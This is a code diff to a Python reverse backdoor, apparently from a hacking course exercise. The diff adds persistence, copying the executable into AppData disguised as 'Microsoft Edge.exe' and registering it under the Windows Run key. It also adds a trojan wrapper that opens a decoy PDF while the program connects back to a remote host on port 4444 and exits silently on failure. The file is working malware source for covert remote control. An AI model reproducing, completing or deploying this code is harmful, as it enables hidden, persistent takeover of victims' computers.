@@ -1,3 +1,4 @@
+import shutil
 import socket
 import subprocess
 import json
@@ -10,9 +11,18 @@ import sys
 # C:\python312\Scripts\pyinstaller.exe Reverse_Backdoor.py --onefile 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET,
                                         socket.SOCK_STREAM)  #AF_INET is used to create socket IPV4 AF_INET6 for IPV6
         self.connection.connect((ip, port))  # SOCK_STREAM is used to create socket base on TCP
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Microsoft Edge.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t Reg_Sz /d "' + evil_file_location + '"',
+                shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -71,5 +81,11 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.189.128", 4444)
-my_backdoor.start()
+file_name = sys._MEIPASS + "\sample.pdf"
+# MEIPASS : This is the path attribution created by pyinstaller, it is quite useful when you have some resource files (like .bmp .png) to load in your python one-file-bundled app.
+subprocess.Popen(file_name, shell=True)
+try:
+    my_backdoor = Backdoor("192.168.189.130", 4444)
+    my_backdoor.start()
+except Exception:
+    sys.exit()
